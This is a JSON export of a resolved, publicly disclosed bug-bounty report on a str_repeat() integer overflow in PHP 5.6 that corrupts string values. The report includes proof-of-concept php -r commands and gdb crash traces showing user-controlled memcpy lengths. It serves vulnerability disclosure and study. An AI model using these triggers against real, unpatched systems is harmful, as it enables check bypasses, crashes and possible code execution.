{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": null, 
    "voters": [], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "500.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 73255, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2015-05-12T00:00:00.000Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "str_repeat() sign mismatch based memory corruption", 
    "is_member_of_team?": null, 
    "vote_count": 0, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": null, 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$500", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2015-06-30T11:44:48.344Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-30T11:44:48.344Z", 
            "actor": {
                "url": "/ibb-php", 
                "profile": {
                    "name": "PHP (IBB)"
                }, 
                "ibb": true, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/029/991fb39ba898696eb6ae62521c49b292b2a9cf95_medium.png?1385119730"
                }
            }, 
            "team_handle": "ibb-php", 
            "bounty_amount": "500.0", 
            "collaborator": {
                "username": "cogitoergor00t", 
                "url": "/cogitoergor00t"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 496267, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "cogitoergor00t", 
                "url": "/cogitoergor00t"
            }, 
            "created_at": "2015-06-30T11:44:48.344Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-15T13:29:46.350Z", 
            "actor": {
                "url": "/ibb-php", 
                "profile": {
                    "name": "PHP (IBB)"
                }, 
                "ibb": true, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/029/991fb39ba898696eb6ae62521c49b292b2a9cf95_medium.png?1385119730"
                }
            }, 
            "team_handle": "ibb-php", 
            "message": null, 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 1196230, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "reporter": {
        "username": "cogitoergor00t", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/cogitoergor00t", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/020/061/3edeef7d9d8b8a6151610c475fd927b51d73ad7a_small.jpg?1435713632"
        }, 
        "is_me?": false
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "disclosed_at": "2015-05-12T00:00:00.000Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/73255", 
    "created_at": "2015-04-09T00:00:00.000Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<h1 id=\"overview\">OVERVIEW</h1>\n\n<p>str_repeat() suffers from a sign mismatch based integer overflow that results in creation of corrupted ZVALs; this condition, depending on the context, can be abused to bypass PHP-level checks or trigger any kind of memory error: a successful exploitation of this issue is likely to produce both local and remote code execution vectors.</p>\n\n<h1 id=\"details\">DETAILS</h1>\n\n<p>str_repeat() takes mult as second argument, which represents the number of desired repetitions for the string passed as first argument. Once retrieved, this value is multiplied by input_len and stored into result_len</p>\n<pre class=\"highlight plaintext\"><code>    /* Initialize the result string */\n4907    result_len = input_len * mult;\nwhich then, on line 4930 is passed as argument for RETURN_STRINGL() macro.\nIt should be noticed that while RETURN_STRINGL() ends up calling ZVAL_STRINGL(), which expects the length argument to be a signed int, result_len is defined as size_t, producing an implicit cast of the actual value.\nIn situations in which huge memory allocations are possible (most likely 64-bit systems), it is possible to take advantage of this situation overflowing ZVAL_STRINGL&#39;s length into a negative value, in order to get a corrupted string-typed ZVAL.\n(gdb) r -r &#39;var_dump(str_repeat(&quot;a&quot;, 4294967294+1));&#39;\n\nBreakpoint 1, php_var_dump (struc=0x7ffff7f8a188, level=level@entry=1)\n    at /build/buildd/php5-5.6.7+dfsg/ext/standard/var.c:88\n88        /build/buildd/php5-5.6.7+dfsg/ext/standard/var.c: No such file or directory.\n(gdb) p **struc\n$7 = {value = {lval = 140732723359792, dval = 6,9531203857753119e-310, str = {\n      val = 0x7ffee3fbf030 &#39;a&#39; &lt;repeats 200 times&gt;..., len = -1}, \n    ht = 0x7ffee3fbf030, obj = {handle = 3824939056, \n      handlers = 0x7fffffffffff}, ast = 0x7ffee3fbf030}, refcount__gc = 1, \n  type = 6 &#39;\\006&#39;, is_ref__gc = 0 &#39;\\000&#39;}\n</code></pre>\n<h1 id=\"exploitation\">EXPLOITATION</h1>\n\n<p>The easiest use of this issue could be bypassing PHP-level checks:</p>\n<pre class=\"highlight plaintext\"><code>$ php -r &#39;echo strlen(str_repeat(&quot;a&quot;, 4294967294));&#39;\n-2\n</code></pre>\n<p>More interesting scenario comes up when more complex elaborations are applied to a corrupted ZVAL, here I&#39;m gonna list a non-exaustive series of examples which could differ both in severity and exploitability, just to give you an idea.</p>\n<pre class=\"highlight plaintext\"><code>(gdb) r -r &#39;strtoupper(str_repeat(&quot;a&quot;, 4294967294+1));&#39;\nStarting program: /usr/bin/php -r &#39;strtoupper(str_repeat(&quot;a&quot;, 4294967294+1));&#39;\n\nProgram received signal SIGSEGV, Segmentation fault.\n__memcpy_sse2_unaligned ()\n    at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:37\n37        ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S: No such file or directory.\n(gdb) x/i $pc\n=&gt; 0x7ffff5b2b005 &lt;__memcpy_sse2_unaligned+53&gt;:        movdqu %xmm8,-0x10(%rdi,%rdx,1)\n\n(gdb) p/x $rdx\n$15 = 0xffffffff\n &lt;== user controlled\n(gdb) p/x $rdi\n$16 = 0x7ffff7fc0a70\n(gdb) p $xmm8\n$17 = {v4_float = {2,59845894e+20, 2,59845894e+20, 2,59845894e+20, \n    2,59845894e+20}, v2_double = {1,2217638442043777e+161, \n    1,2217638442043777e+161}, v16_int8 = {97 &lt;repeats 16 times&gt;}, v8_int16 = {\n    24929, 24929, 24929, 24929, 24929, 24929, 24929, 24929}, v4_int32 = {\n    1633771873, 1633771873, 1633771873, 1633771873}, v2_int64 = {\n    7016996765293437281, 7016996765293437281}, \n  uint128 = 0x61616161616161616161616161616161}\n\n\n\n(gdb) r -r &#39;md5(str_repeat(&quot;a&quot;, 4294967294-1));&#39;\n\nProgram received signal SIGSEGV, Segmentation fault.\nbody (ctx=ctx@entry=0x7fffffffc5c0, data=data@entry=0x7ffee3fbf030, \n    size=18446744069414182912)\n    at /build/buildd/php5-5.6.7+dfsg/ext/standard/md5.c:214\n214        /build/buildd/php5-5.6.7+dfsg/ext/standard/md5.c: No such file or directory.\n\n\n(gdb) r -r &#39;str_repeat(&quot;a&quot;, 4294967294+1).&quot;&quot;;&#39;\n\nProgram received signal SIGSEGV, Segmentation fault.\n__memcpy_sse2_unaligned ()\n    at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:152\n152        ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S: No such file or directory.\n</code></pre>", 
    "vulnerability_information": "# OVERVIEW\nstr_repeat() suffers from a sign mismatch based integer overflow that results in creation of corrupted ZVALs; this condition, depending on the context, can be abused to bypass PHP-level checks or trigger any kind of memory error: a successful exploitation of this issue is likely to produce both local and remote code execution vectors.\n\n# DETAILS\nstr_repeat() takes mult as second argument, which represents the number of desired repetitions for the string passed as first argument. Once retrieved, this value is multiplied by input_len and stored into result_len\n\n```\n    /* Initialize the result string */\n4907    result_len = input_len * mult;\nwhich then, on line 4930 is passed as argument for RETURN_STRINGL() macro.\nIt should be noticed that while RETURN_STRINGL() ends up calling ZVAL_STRINGL(), which expects the length argument to be a signed int, result_len is defined as size_t, producing an implicit cast of the actual value.\nIn situations in which huge memory allocations are possible (most likely 64-bit systems), it is possible to take advantage of this situation overflowing ZVAL_STRINGL's length into a negative value, in order to get a corrupted string-typed ZVAL.\n(gdb) r -r 'var_dump(str_repeat(\"a\", 4294967294+1));'\n\nBreakpoint 1, php_var_dump (struc=0x7ffff7f8a188, level=level@entry=1)\n    at /build/buildd/php5-5.6.7+dfsg/ext/standard/var.c:88\n88        /build/buildd/php5-5.6.7+dfsg/ext/standard/var.c: No such file or directory.\n(gdb) p **struc\n$7 = {value = {lval = 140732723359792, dval = 6,9531203857753119e-310, str = {\n      val = 0x7ffee3fbf030 'a' <repeats 200 times>..., len = -1}, \n    ht = 0x7ffee3fbf030, obj = {handle = 3824939056, \n      handlers = 0x7fffffffffff}, ast = 0x7ffee3fbf030}, refcount__gc = 1, \n  type = 6 '\\006', is_ref__gc = 0 '\\000'}\n```\n\n# EXPLOITATION\nThe easiest use of this issue could be bypassing PHP-level checks:\n\n```\n$ php -r 'echo strlen(str_repeat(\"a\", 4294967294));'\n-2\n```\n\nMore interesting scenario comes up when more complex elaborations are applied to a corrupted ZVAL, here I'm gonna list a non-exaustive series of examples which could differ both in severity and exploitability, just to give you an idea.\n\n```\n(gdb) r -r 'strtoupper(str_repeat(\"a\", 4294967294+1));'\nStarting program: /usr/bin/php -r 'strtoupper(str_repeat(\"a\", 4294967294+1));'\n\nProgram received signal SIGSEGV, Segmentation fault.\n__memcpy_sse2_unaligned ()\n    at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:37\n37        ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S: No such file or directory.\n(gdb) x/i $pc\n=> 0x7ffff5b2b005 <__memcpy_sse2_unaligned+53>:        movdqu %xmm8,-0x10(%rdi,%rdx,1)\n\n(gdb) p/x $rdx\n$15 = 0xffffffff\n <== user controlled\n(gdb) p/x $rdi\n$16 = 0x7ffff7fc0a70\n(gdb) p $xmm8\n$17 = {v4_float = {2,59845894e+20, 2,59845894e+20, 2,59845894e+20, \n    2,59845894e+20}, v2_double = {1,2217638442043777e+161, \n    1,2217638442043777e+161}, v16_int8 = {97 <repeats 16 times>}, v8_int16 = {\n    24929, 24929, 24929, 24929, 24929, 24929, 24929, 24929}, v4_int32 = {\n    1633771873, 1633771873, 1633771873, 1633771873}, v2_int64 = {\n    7016996765293437281, 7016996765293437281}, \n  uint128 = 0x61616161616161616161616161616161}\n\n\n\n(gdb) r -r 'md5(str_repeat(\"a\", 4294967294-1));'\n\nProgram received signal SIGSEGV, Segmentation fault.\nbody (ctx=ctx@entry=0x7fffffffc5c0, data=data@entry=0x7ffee3fbf030, \n    size=18446744069414182912)\n    at /build/buildd/php5-5.6.7+dfsg/ext/standard/md5.c:214\n214        /build/buildd/php5-5.6.7+dfsg/ext/standard/md5.c: No such file or directory.\n\n\n(gdb) r -r 'str_repeat(\"a\", 4294967294+1).\"\";'\n\nProgram received signal SIGSEGV, Segmentation fault.\n__memcpy_sse2_unaligned ()\n    at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:152\n152        ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S: No such file or directory.\n```\n", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "http://www.php.net", 
            "about": "", 
            "twitter_handle": "", 
            "name": "PHP (IBB)"
        }, 
        "handle": "ibb-php", 
        "url": "https://hackerone.com/ibb-php", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/029/0a20311cece1ff1938eac3f9b09a6af056bc9e90_small.png?1385119730", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/029/991fb39ba898696eb6ae62521c49b292b2a9cf95_medium.png?1385119730"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 29, 
        "default_currency": "usd"
    }, 
    "is_published": false
}